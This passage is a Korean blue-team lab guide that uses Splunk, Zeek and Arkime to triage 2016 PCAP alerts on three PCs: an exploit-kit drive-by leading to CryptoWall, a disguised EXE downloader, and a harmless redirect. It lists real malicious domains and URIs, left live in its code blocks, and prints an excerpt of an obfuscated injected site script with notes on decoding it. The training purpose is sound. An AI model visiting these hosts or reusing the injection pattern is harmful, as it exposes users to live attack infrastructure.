---
title: Alerts on 3 different hosts — EK 드라이브바이에서 CryptoWall까지, 메일 JS 다운로더, 아무 일 없던 리다이렉트 (Splunk 중심, Arkime 보조)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - exploit-kit
  - cryptowall
  - ransomware
  - js-downloader
---

# Alerts on 3 different hosts — EK 드라이브바이에서 CryptoWall까지, 메일 JS 다운로더, 아무 일 없던 리다이렉트 { #alerts-3-hosts }

!!! abstract "사례 요약"
    malware-traffic-analysis.net의 **2016-01-07 "Alerts on 3 different hosts" 실습**을 홈 랩 **pcapbox** VM에서 따라 할 수 있게 쓴 가이드예요. 주 도구는 **Splunk**(Zeek 로그)이고, **Splunk로 내용을 볼 수 없을 때만 Arkime**를 써요. SOC 화면에 윈도우 7 PC 세 대의 "evil" 경보가 몇 분 사이에 떠요. 할 일은 PC마다 **무슨 일이 있었고 감염됐는지** 판단하는 거예요. 세 PC의 모습이 모두 달라서, 이 사례로 **진짜 감염과 아무 일 없이 끝난 경보를 구별하는 법**을 연습해요.

| | |
|---|---|
| **증거** | `2016-01-07-traffic-analysis-exercise.pcap` — 2016-01-07 22:05:47 – 22:17:18 UTC (약 11.5분) |
| **출처** | [malware-traffic-analysis.net 2016-01-07 "Alerts on 3 different hosts"](https://malware-traffic-analysis.net/2016/01/07/index.html) |
| **주어진 정보** | LAN 정보 없음. 대역, 게이트웨이, PC를 직접 찾아요 |
| **질문** | 시간 범위 · PC 세 대의 IP, MAC, 호스트 이름 · PC마다 무슨 일이 있었고 감염됐는지 · 후속 조치 권고 |
| **환경** | 폐쇄망. pcapbox VM: Splunk(`index=zeek`, 케이스 필드 `pcap_case`), Arkime(태그 = 케이스 이름), Snort 2.9.20. **Wireshark 사용 안 함.** |
| **케이스 이름** | `20160107_ALERTS_ON_3_DIFFERENT_HOSTS` |
| **관련 페이지** | [Sorting through the alerts(같은 방법, PC 한 대)](socgholish-fake-chrome-update-wscript-c2.md) · [피싱 미끼에서 EK 드라이브바이까지](phishing-red-herring-ek-driveby-ursnif-c2.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Zeek 로그](../../network/zeek/index.md) |

!!! tip "이 페이지 쓰는 법"
    순서대로 따라 해요. 단계마다 **목적 → Splunk 쿼리(한 줄씩 설명) → 보여야 하는 결과 → 결과 읽기** 순서예요. Arkime는 Splunk로 페이지나 본문을 볼 수 없을 때만 나와요.

    결과 블록은 같은 PCAP으로 미리 뽑아 둔 값이에요. **호스트, 시간, URI, 크기는 pcapbox 결과와 맞춰 확인했어요. 합계(예: `conn` 줄 수)는 조금 다를 수 있어요.** Zeek 버전마다 UDP와 재시도 연결을 나누는 방식이 달라서예요. 핵심 줄이 다르면 멈추고 케이스 이름과 시간 범위부터 확인해요.

    표시: **[데이터]** = Splunk나 Arkime에서 본 것, **[추측]** = 아직 증명이 필요한 결론.

!!! warning "이 페이지의 지표는 실제 값이에요"
    도메인, IP, 해시는 2016년 실제 악성 트래픽에서 나온 값이에요. 본문과 표에서는 무력화(`hxxp`, `[.]`)했고, 코드 블록 안은 입력할 값 그대로예요. **절대 접속하지 마세요.** 추출한 것은 실행하지 마세요.

??? success "답 — 다 끝낸 뒤에만 열어 보세요"
    | PC | IP / MAC / 호스트 이름 | 무슨 일 | 감염? |
    |---|---|---|---|
    | A | 192.168.122.132 · 48:5b:39:c1:f2:48 · **Hokaydoo-PC** | 구글 검색 결과 → 해킹된 `www.koeppl[.]com` → `*.securetopc[.]top`의 익스플로잇 킷(Flash 익스플로잇, 암호화된 페이로드) → 해킹된 사이트들로 **CryptoWall** 체크인 → 사용자가 **"Decrypt service"** 몸값 페이지를 엶 | **예 — 랜섬웨어** |
    | B | 192.168.122.130 · 00:22:19:e2:4b:86 · **FULL-METAL-JACK** | Yahoo 웹메일을 쓰는 동안 스크립트(`MSIE 7.0` User-Agent, `id=` 안에 이메일 주소)가 해킹된 사이트 3곳에서 **`.gif`로 위장한** 윈도우 EXE를 6번 내려받음 | **예 — 악성코드 다운로드**(이후 통신은 안 보임) |
    | C | 192.168.122.52 · 00:26:55:32:a9:17 · **Jennifer-PC** | Yahoo 검색 → `mootools-core.js`에 스크립트가 심긴 `planetside.co[.]uk` → 게이트 `st.domandvilma[.]com`이 **빈 값**을 줌 → 스크립트가 쿠키만 만들고 멈춤 | **아니요** — 경보만 |

---

## 0단계 — PCAP 넣고 케이스 확인 { #prep }

**목적:** PCAP에 케이스 이름을 붙여서 다른 실습 로그와 절대 섞이지 않게 하고, 모든 도구를 **UTC**로 맞춰요.

1. 파일 이름을 **`20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap`**으로 바꾸고 `\\10.50.10.60\incoming`에 복사해요.
2. pcapbox에서 `tail -f /data/logs/ingest.log`를 보다가 `DONE case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS`가 나오면 끝이에요. **한 번만 넣어요.** 다시 넣으면 로그가 모두 두 번 들어가요.
3. Splunk **Preferences → Time zone = UTC**, Arkime **Settings → Timezone = UTC**, 시간 범위 **All**.

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek` — Zeek 로그가 든 인덱스(Splunk의 "서랍")만 봐요.
- `sourcetype=zeek:conn` — 연결 로그예요. 연결 하나가 한 줄이에요.
- `|` — 왼쪽 결과를 다음 명령으로 넘겨요.
- `stats count by pcap_case` — 케이스 이름마다 줄 수를 세요. 새 케이스가 목록에 있어야 해요.

!!! note "시간은 `ts`"
    Zeek의 이벤트 시간은 **`ts`**(epoch 초)예요. 쿼리는 모두 `ts`로 정렬하고 출력해요. `eval t=strftime(ts,"%H:%M:%S")`로 읽기 쉽게 바꿔요.

---

## 1단계 — 베이스라이닝: 이 캡처의 평소 모습 { #baseline }

베이스라이닝 = **평소 모습**을 먼저 아는 거예요. 시간 범위, 로그 종류, 어떤 PC가 있는지, 누구인지, 보통 어떻게 웹을 쓰는지. 그래야 "이상한 것"이 눈에 띄어요.

### 1-1. 어떤 로그가 있나 { #log-types }

```spl
index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats count by sourcetype
| sort - count
```

- `sourcetype`을 안 적어서 이 케이스의 **모든 로그 종류**를 가져와요. `sort - count` = 많은 순서.

**보여야 하는 결과(정확한 숫자가 아니라 순서):** `zeek:conn`(약 520줄), `zeek:http`(수백 줄), `zeek:dns`, `zeek:ssl`, `zeek:files`, `zeek:x509`, `zeek:dhcp`, `zeek:software`, 있으면 `zeek:weird`, `zeek:pe`.

**[데이터] 결과 읽기:**

- **`zeek:dhcp`가 있어요.** 캡처 중에 PC들이 IP를 요청했다는 뜻이라, DHCP로 이름, MAC, IP를 바로 알 수 있어요(1-4).
- **`kerberos`, `ldap`, `smb_*`가 없어요.** AD 도메인이 없어요. 혼자 쓰는 PC들이라 찾을 사용자 이름도 없어요.
- **`zeek:http`가 많아요.** 내용을 다 읽을 수 있는 평문 웹 통신이 많다는 뜻이라 이번 사례엔 좋은 소식이에요.
- **`zeek:pe`**(있다면)는 Zeek가 **통신 안에서 윈도우 프로그램**(EXE/DLL)을 봤다는 뜻이에요. 평범한 사무실 캡처에선 드물어요. 메모해요.

### 1-2. 캡처 시간 범위 { #window }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- 2줄: 한 줄로 요약해요 — 가장 이른 연결 시작, 가장 늦은 연결 시작, 연결 수. `as`는 결과에 이름을 붙여요.
- 3줄: 분 단위, 소수 한 자리. **4줄보다 먼저** 와야 해요. 4줄을 지나면 `first`/`last`가 글자가 돼서 뺄셈을 못 해요.
- 4줄: epoch → 읽을 수 있는 날짜.

**보여야 하는 결과:** `first` **2016-01-07 22:05:47**, `last` 약 **22:17**(마지막 연결의 **시작** 시각이에요. 마지막 패킷은 22:17:18), 약 **11.5분**, 연결 약 **520**개.

### 1-3. 어떤 내부 IP가 연결을 시작하나 { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.0.0/16
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h
| eval first=strftime(first,"%H:%M:%S")
| sort first
```

- `id_orig_h` = 연결을 **시작한** IP(`orig` = 시작한 쪽, `resp` = 받은 쪽, `_h` = IP, `_p` = 포트).
- `id_orig_h=192.168.0.0/16` — Splunk는 IP 필드에 대역(CIDR)을 쓰면 알아서 맞춰 봐요. 192.168.x.x 사설 IP만 남겨요.
- `dc()` = 중복 빼고 세기. `orig_bytes` / `resp_bytes` = 양쪽이 보낸 데이터 바이트.

**보여야 하는 결과(모양. 숫자는 조금 다를 수 있어요):**

```text
id_orig_h         sessions  destinations  first
192.168.122.130   …         …             22:05:51
192.168.122.52    (가장 많음) …           22:06:06
192.168.122.132   …         …             22:06:25
192.168.122.1     몇 개 (DHCP 응답)
```

**[데이터] 결과 읽기:**

- **LAN = 192.168.122.0/24.** PC 세 대: **.130, .52, .132**.
- **192.168.122.1**은 연결을 거의 시작하지 않아요. **게이트웨이, DHCP 서버, DNS 서버**예요(1-4와 1-6에서 확인).
- 세 PC가 차례로 시작해요(22:05:51, 22:06:06, 22:06:25). 캡처 시작 무렵에 켜졌어요.

### 1-4. 누가 누구인가 — DHCP { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval t=strftime(ts,"%H:%M:%S")
| table t client_addr assigned_addr mac host_name msg_types server_addr
| sort t
```

- `zeek:dhcp` = DHCP 주고받기 한 번이 한 줄. `assigned_addr` = 서버가 준 IP, `mac` = PC의 네트워크 카드, `host_name` = PC가 보낸 이름(DHCP 옵션 12).
- `msg_types`: **REQUEST/ACK** = "이 IP 써도 돼요?" / "네", **INFORM/ACK** = "IP는 있어요, 설정만 주세요".

**보여야 하는 결과:**

```text
t         client_addr      assigned_addr    mac                 host_name         msg_types
22:05:47                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
22:05:51                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
22:05:54  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
22:06:02                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
22:06:06                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
22:06:10  192.168.122.52                    00:26:55:32:a9:17   Jennifer-PC       INFORM ACK
22:06:21                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
22:06:25                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
22:06:29  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
22:10:45  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
22:11:53  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
```

**[데이터] 결과 읽기:** 이름 셋, MAC 셋, IP 셋이에요. PC마다 REQUEST를 4초 간격으로 두 번 보내고, 그다음 INFORM을 보냈어요. INFORM 줄은 `assigned_addr`가 비어요. PC가 이미 IP를 갖고 있어서 그 IP가 `client_addr`에 나와요. `server_addr`는 **192.168.122.1**이에요. 실습 질문 2번의 답이에요.

| IP | MAC | 호스트 이름 |
|---|---|---|
| 192.168.122.130 | 00:22:19:e2:4b:86 | FULL-METAL-JACK |
| 192.168.122.52 | 00:26:55:32:a9:17 | Jennifer-PC |
| 192.168.122.132 | 48:5b:39:c1:f2:48 | Hokaydoo-PC |

!!! question "질문: .132와 .130은 왜 나중에 DHCP INFORM을 한 번 더 보냈나요?"
    무언가 네트워크 설정을 다시 물으면 윈도우가 INFORM을 보내요. 새 네트워크 확인이나 프로그램 시작 같은 때예요. 그것만으로는 아무 뜻이 없어요. 시간(22:10:45, 22:11:53)을 메모해 두고 그 무렵에 다른 일이 있는지 봐요. (힌트만: 둘 다 3단계와 4단계의 중요한 일과 몇 초 차이예요.)

### 1-5. 각 PC가 쓰는 프로그램 — User-Agent { #user-agents }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(host) as sites by id_orig_h user_agent
| sort id_orig_h first
```

- `user_agent` = HTTP 요청마다 프로그램이 스스로 밝히는 이름이에요. 브라우저에 하나, 다른 프로그램은 자기 것이 있어요.
- `eval host=mvdedup(host)` — `host` 값을 하나만 남겨요(pcapbox Splunk가 예전에 두 번 저장하던 문제. 습관으로 넣어도 해가 없어요).
- `stats … by id_orig_h user_agent` = **PC + 프로그램** 짝마다 한 줄.

**보여야 하는 결과:**

```text
id_orig_h        user_agent                                                                  first     count  sites
192.168.122.130  Microsoft NCSI                                                              22:05:58  1      1
192.168.122.130  Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)            22:07:00  1      1
192.168.122.130  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; ...)  22:11:53  9      3
192.168.122.132  Microsoft NCSI                                                              22:06:33  1      1
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko        22:10:08  ~80    9
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR ...; rv:11.0) like Gecko  22:10:26  1  1
192.168.122.132  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)  22:10:47  4      2
192.168.122.52   Microsoft NCSI                                                              22:06:13  1      1
192.168.122.52   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)             22:08:49  202    ~16
```

**[데이터] 결과 읽기:**

- 셋 다 `Windows NT 6.1` = **윈도우 7**이에요. `Microsoft NCSI` = 켜질 때 윈도우가 "인터넷 되나?" 확인하는 것 — 정상이에요.
- 브라우저: .130 **IE 10**, .52 **IE 9**, .132 **IE 11**(`Trident/7.0; rv:11.0`, 64비트 윈도우: `WOW64`).
- **PC 두 대에 나중에 "MSIE 7.0"이 나와요**(.130 22:11:53, .132 22:10:47). IE 7은 2006년 브라우저예요. 윈도우 7에서 이 이름은 **스크립트와 프로그램이 쓰는 윈도우 자체 HTTP 객체**(WScript, 많은 악성코드)의 기본 User-Agent예요. **사용자의 브라우저가 아니에요.** 후보예요.
- **.132에 한 번만 쓰인 세 번째 User-Agent**(22:10:26)가 있어요. `.NET CLR`이 더 붙은 IE 11이에요. 다른 프로그램이 그 요청 하나를 했어요. 후보예요.

### 1-6. DNS 서버 { #dns-servers }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_resp_p=53
| stats count by id_orig_h id_resp_h
```

**보여야 하는 결과:** .130과 .52는 **192.168.122.1**에 물어요. **.132는 8.8.8.8과 8.8.4.4**(구글)에 물어요. [데이터] 누군가 .132의 DNS를 손으로 바꿨어요. 그 자체가 악성은 아니지만, 게이트웨이의 DNS 로그로는 .132의 조회를 **못 본다**는 뜻이라 보고서에 한 줄 쓸 만해요.

**베이스라인 메모 — 후보만, 결론은 아직:**

1. 22:10:26 — .132, 한 번만 쓰인 IE 11 변형 User-Agent
2. 22:10:47 — .132, `MSIE 7.0`
3. 22:11:53 — .130, `MSIE 7.0`

---

## 2단계 — PC마다 어디를 갔나: 정상 지우기 { #triage }

### 2-1. PC별 HTTP 사이트, 시간 순서 { #http-per-pc }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host
| sort id_orig_h first
```

- `host` = HTTP Host 헤더(사이트 이름). `method`: **GET** 가져오기, **POST** 보내기.
- `response_body_len` = 서버가 돌려준 바이트(압축을 푼 뒤).

**보여야 하는 결과(핵심 줄):**

```text
id_orig_h        host                                     first     count  methods    received
192.168.122.130  www.msftncsi.com                         22:05:58  1      GET
192.168.122.130  mail.yahoo.com                           22:07:00  1      GET        (그 뒤는 HTTPS — 4단계)
192.168.122.130  ma-wt.com.sa                             22:11:53  3      GET        375301
192.168.122.130  dariostoka.com                           22:11:55  3      GET        375301
192.168.122.130  freshanointingministries-sc.org          22:11:57  3      GET        406541
192.168.122.132  www.msftncsi.com                         22:06:33  1      GET
192.168.122.132  www.google.com.au                        22:10:08  1      GET
192.168.122.132  www.koeppl.com                           22:10:10  55     GET
192.168.122.132  translate.google.com / pbs.twimg.com / stats.g.doubleclick.net / joomla-gtranslate.googlecode.com   (각 1개)
192.168.122.132  uacltr.securetopc.top                    22:10:15  3      GET        84264
192.168.122.132  gbesbsdsb.securetopc.top                 22:10:23  2      GET        421888
192.168.122.132  bizsouls.com                             22:10:47  3      POST       123682
192.168.122.132  estudiobarco.com.ar                      22:12:14  1      POST       6
192.168.122.132  3wzn5p2yiumh7akj.waytopaytosystem.com    22:16:46  17     GET POST
192.168.122.52   www.msftncsi.com                         22:06:13  1      GET
192.168.122.52   au.search.yahoo.com / l.yimg.com / ri.search.yahoo.com   22:08:49   (Yahoo 검색)
192.168.122.52   planetside.co.uk                         22:09:12  ~80    GET POST
192.168.122.52   st.domandvilma.com                       22:09:24  1      GET        26
192.168.122.52   ajax.googleapis.com / ajax.aspnetcdn.com / www.google-analytics.com   (사이트 구성 파일)
192.168.122.52   www.outdoorsamoa.com / www.tripadvisor.com / fonts.* / static.tacdn.com   22:15:29 …
```

**정상을 지우는 방법:**

1. 윈도우 자체: `msftncsi.com`.
2. 잘 아는 큰 서비스와 그 부속: 구글(`google.*`, `gstatic`, `googleapis`, `google-analytics`, `doubleclick`), Yahoo(`yahoo.com`, `yimg.com`), 트위터(`twimg.com`), 마이크로소프트 CDN(`aspnetcdn.com`), 트립어드바이저(`tripadvisor.*`, `tacdn.com`, `jscache.com`).
3. 사용자가 분명히 고른 사이트(검색 결과, 직접 친 주소)와 그 사이트가 자기 이름으로 불러오는 파일.

**[데이터] 남는 것:**

| PC | 남은 것 | 이상한 이유 |
|---|---|---|
| .132 | `uacltr.securetopc.top`, `gbesbsdsb.securetopc.top` | `.top` 도메인에 아무렇게나 만든 하위 이름, 정상 사이트 몇 초 뒤 |
| .132 | `bizsouls.com`, `estudiobarco.com.ar` | **POST만**, `MSIE 7.0` 프로그램(후보 2)이 보냄 |
| .132 | `3wzn5p2yiumh7akj.waytopaytosystem.com` | 무작위 16글자 + "way to pay to system(돈 내는 시스템)" |
| .130 | `ma-wt.com.sa`, `dariostoka.com`, `freshanointingministries-sc.org` | 서로 관계없는 사이트 셋에 같은 3번 요청, 각 약 375–406 KB, `MSIE 7.0`(후보 3)이 보냄 |
| .52 | `st.domandvilma.com` | 사용자가 연 사이트의 일부가 아님. 받은 건 **26바이트**뿐 |

### 2-2. DNS 없이 간 목적지 — 여기선 왜 안 나오나 { #no-dns }

지난 사례에서는 이 쿼리로 C2를 찾았어요. 해 보세요. **방법이 아무것도 못 찾을 때를 아는 것**도 실력이에요.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.0/24 proto=tcp NOT id_resp_h=192.168.0.0/16
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| stats count by id_orig_h id_resp_h id_resp_p
```

- `[ … ]` **서브서치**가 먼저 실행돼서 DNS 답에 나온 IP를 모두 모아요(`mvexpand` = 값마다 한 줄, `rename` = conn 필드 이름과 맞추기). `NOT`이 붙어서 **한 번도 조회하지 않은** TCP 목적지만 남아요.

**보여야 하는 결과:** **결과 없음.** [데이터] 외부 TCP 목적지는 모두 이름으로 찾아갔어요. 이 캡처의 악성 활동은 모두 **도메인**을 써요. 그래서 "하드코딩된 IP"를 찾는 것보다 HTTP와 DNS(2-1)를 보는 게 맞아요.

**계획:** PC 하나씩, 심각해 보이는 순서로: **.132**(이상한 통신이 세 종류) → **.130** → **.52**.

---

## 3단계 — PC A: 192.168.122.132 Hokaydoo-PC { #pc-a }

### 3-1. Referer로 이어 보기 { #pc-a-chain }

**Referer** 헤더는 "나는 이 페이지에서 왔어요"라는 뜻이에요. 따라가면 어떤 페이지가 무엇을 불렀는지 이어져요. (HTTP 철자는 *Referer*, Zeek 필드 이름은 `referrer`예요.)

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 ts>=1452204600
| eval host=mvdedup(host)
| search NOT host IN ("*google*","*twimg.com","*doubleclick.net","*googlecode.com") NOT uri="*.css*" NOT uri="*.png*" NOT uri="*.jpg*" NOT uri="*.gif*" NOT uri="*.js*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| sort ts
| table t host uri referrer user_agent status_code resp_mime_types response_body_len
```

- `ts>=1452204600` = **22:10:00 UTC**부터예요(epoch 초. `| makeresults | eval x=strftime(1452204600,"%H:%M:%S")`로 확인할 수 있어요).
- `host IN ("*google*", …)` — `IN`에 `*`를 쓸 수 있어요. `NOT`과 함께 잡음을 숨겨요(22:10:08의 구글 결과 클릭도 숨겨져요). `uri` 조건은 정상 사이트의 이미지, 스타일, 스크립트를 숨겨요.
- `resp_mime_types` = 서버가 붙인 이름표가 아니라 Zeek이 **내용을 보고** 판단한 형식이에요.

**보여야 하는 결과:**

```text
t              host                                    uri                                                          referrer                                   status  resp_mime_types                response_body_len
22:10:10.863   www.koeppl.com                          /                                                            http://www.google.com.au/url?sa=t&rct=j…  200     text/plain                     62939
22:10:15.930   uacltr.securetopc.top                   /1993/10/14/madness/willow/dick-sort-southward-swallow.html  http://www.koeppl.com/                     200     text/html                      1035
22:10:16.598   uacltr.securetopc.top                   /1987/09/28/behave/cheerful-stumble-broad.html.swf           http://uacltr.securetopc.top/1993/10/14/…  -       -                              0
22:10:17.300   uacltr.securetopc.top                   /1987/09/28/behave/cheerful-stumble-broad.html.swf           http://uacltr.securetopc.top/1993/10/14/…  200     application/x-shockwave-flash  83229
22:10:23.164   gbesbsdsb.securetopc.top                /surprise/1430317/fellow-touch-death-curl-cast-dance-bubble-moonlight-shock  http://uacltr.securetopc.top/…  200  -       0
22:10:26.229   gbesbsdsb.securetopc.top                /officer/1277929/tidings-humble-communication                -                                          200     -                              421888
22:10:47.545   bizsouls.com                            /XG3vxT.php?y=21657wkalasvbb                                 -                                          200     text/plain                     14
22:10:51.876   bizsouls.com                            /XG3vxT.php?c=a2py731nhw                                     -                                          200     text/plain                     123668
22:11:11.746   bizsouls.com                            /XG3vxT.php?o=py8nr3ezh06q03o                                -                                          200     -                              0
22:12:14.456   estudiobarco.com.ar                     /5TFv7E.php?z=py8nr3ezh06q03o                                -                                          200     text/plain                     6
22:16:46.032   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p                                                     -                                          200     text/html                      3289
22:16:57.894   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p   (POST)                                            http://3wzn5p2yiumh7akj…/1f96s0p           200     text/html                      14463
```

!!! note "koeppl 첫 페이지가 왜 `text/plain`인가요?"
    Zeek은 파일의 **첫 바이트**를 보고 형식을 정해요. 정상 페이지는 `<!DOCTYPE html>`이나 `<html>`로 시작해요. 이 페이지는 `<style>`로 시작해서(3-2의 심긴 코드) Zeek이 HTML로 알아보지 못했어요. 이상한 형식 자체가 작은 단서예요.

**[데이터] 한 줄씩 읽기:**

1. **22:10:08–10 — 사용자가 구글 검색 결과**에서 `www.koeppl.com`(독일 모터 장비 가게)을 눌렀어요. 정상 방문이고 Referer = 구글이에요.
2. **22:10:15 — koeppl 페이지가 낯선 서버를 불렀어요.** `uacltr.securetopc.top`의 **Referer가 `http://www.koeppl.com/`**이에요. koeppl 페이지 안의 무언가가 브라우저를 그리로 보냈어요.
3. **경로가 날짜와 아무 단어로 만든 블로그 글 같아요**(`/1993/10/14/madness/willow/…html`). 경로의 아무 단어, 싼 `.top` 도메인, IP 하나에 무작위 하위 이름 둘 — 2015년 말~2016년 초 **익스플로잇 킷(EK)** 랜딩 페이지의 전형적인 모습이에요.
4. **22:10:16–17 — 랜딩 페이지가 Flash 파일**(`.swf`, 83 KB)을 불렀어요. 첫 요청은 답이 없어서 브라우저가 다시 물었어요. EK는 Flash 버그를 써서 페이지를 보기만 해도 코드를 실행했어요.
5. **22:10:26 — Referer 없이, 다른 User-Agent로 421,888바이트**(후보 1). 브라우저가 아니라 **익스플로잇 코드가** 페이로드를 내려받은 거예요. Zeek이 **형식을 못 찾아요**(3-3).
6. **22:10:47 — 21초 뒤 새 프로그램(`MSIE 7.0`, 후보 2)이 `bizsouls.com`에 POST**를 세 번, 그다음 `estudiobarco.com.ar`에 해요(3-4).
7. **22:16:46 — `…waytopaytosystem.com` 페이지**를 브라우저(IE 11 User-Agent)가 **Referer 없이** 열었어요(3-5).

!!! question "질문: 사용자가 익스플로잇 킷 링크를 클릭한 게 아니라는 건 어떻게 알아요?"
    **Referer만으로는 알 수 없어요.** 링크를 클릭해도, 스크립트가 자동으로 요청해도 똑같이 `Referer: http://www.koeppl.com/`이 붙어요. 다른 사실 세 가지로 판단해요.

    1. **풀어 본 스크립트가 숨은 iframe을 만들어요**(3-2). iframe 주소가 22:10:15에 요청한 랜딩 주소와 정확히 같아요. 브라우저는 iframe을 스스로 불러와요. 클릭이 필요 없어요.
    2. **koeppl 페이지가 계속 열려 있었어요.** 22:10:34에 브라우저가 koeppl의 `favicon.ico`를 요청했어요. 링크를 클릭했다면 브라우저는 koeppl을 떠났을 거예요.
    3. **스크립트가 브라우저에서 실행됐어요.** 스크립트가 만드는 쿠키 두 개가 다음 koeppl 요청에 나타나고, 서버는 그 쿠키를 준 적이 없어요(3-2).

!!! question "질문: 22:10:45의 DHCP INFORM은 무슨 뜻인가요?"
    1-4를 다시 보면 .132가 **22:10:45**에 DHCP INFORM을 보냈어요. 첫 `MSIE 7.0` POST(22:10:47) **2초 전**이에요. 막 시작한 프로그램이 윈도우에 네트워크 설정을 묻는 것과 맞아요. 페이로드가 실행됐다는 걸 뒷받침하지만 증명하지는 않아요.

### 3-2. 해킹된 사이트 — `<html>` 앞에 심긴 코드 (Arkime) { #pc-a-inject }

Zeek은 요약만 남기고 **페이지 내용은 안 남겨요**. Arkime에서 koeppl 페이지를 열어요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && http.uri == "www.koeppl.com/"
```

!!! warning "Arkime의 `http.uri`에는 도메인이 들어 있어요"
    Arkime는 URI를 **도메인 + 경로**로 저장해요(예: `www.koeppl.com/`). 그래서 `http.uri == "/"`는 **아무것도 못 찾아요**. 전체 값을 따옴표로 쓰거나, 앞에 `*`를 붙여요: `http.uri == */counter/*`.

세션을 펼치고(`+`) **natural**과 **uncompress**를 골라 **응답 본문**까지 내려요(전송 중에는 gzip으로 압축돼 있어요).

```text
<style>.kjpxhkghapgcgt { position: absolute; top: -1357px; left: -1125px}</style>
<div id="nvjgnbocfpotc" class="kjpxhkghapgcgt">a fa e bceid: fb, ocdbf ekdjcpajdcaecrbqbxcpbsed a ucdbdcp b j; dgahaacsera z 'b' ubmaoa ...</div>
<script>
var pxzqxmmylyy=(563738144>878824873?"\x65":"re");
var scestqiccnik=(75811078+892246232<544535642+1517287702?"\x72\x65":"px");
...
</script>
<!DOCTYPE html ...>
<html ...>
```

**[데이터] 결과 읽기:**

- 진짜 웹 페이지는 `<!DOCTYPE html>`이나 `<html>`로 시작해요. 여기는 **약 25 KB의 쓰레기가 먼저** 와요. `<div>`를 화면 밖으로(`top:-1357px`) 보내는 `<style>`과, 뜻 없는 글자로 가득한 `<div>`예요.
- 그다음 `<script>`가 참/거짓 비교로 글자 조각을 골라 단어를 만들어요(`563738144>878824873 ? "e" : "re"`). **난독화**예요. "securetopc"라는 글자가 그대로 나오지 않게 숨긴 거예요.
- **정상 사이트의 `<html>` 앞에 코드가 있다 = 누가 심었다.** 사이트가 해킹됐어요.

??? info "더 깊이: 스크립트가 하는 일 (실행하지 않고 읽어서 풀기)"
    스크립트를 브라우저에서 **실행하지 않고, 읽어서** 풀어요.

    1. `(A>B ? "x" : "y")` 조각마다 숫자 비교만 손이나 작은 스크립트로 계산해요. 조각을 이으면 `[][constructor][constructor](code)()` = `Function(code)()`, 즉 "이 글자를 코드로 실행해"가 돼요.
    2. 브라우저를 확인해요: `rv:11`(IE 11)이나 `MSIE`. 다른 브라우저는 아무것도 받지 않아요.
    3. 숨은 `<div>`의 글자를 **두 개씩** 읽어요(`a`–`z`만). 한 쌍이 숫자 하나예요: 첫 글자 × 26 + 둘째 글자. 그 숫자를 키 `senP7ICzRjcg5`와 XOR해서 글자로 바꿔요.

    결과:

    ```text
    var date = new Date(new Date().getTime() + 60*60*24*7*1000);
    document.cookie = "PHP_SESSION_PHP=120; path=/; expires="+date.toUTCString();
    document.cookie = "_PHP_SESSION_PHP=123; path=/; expires="+date.toUTCString();
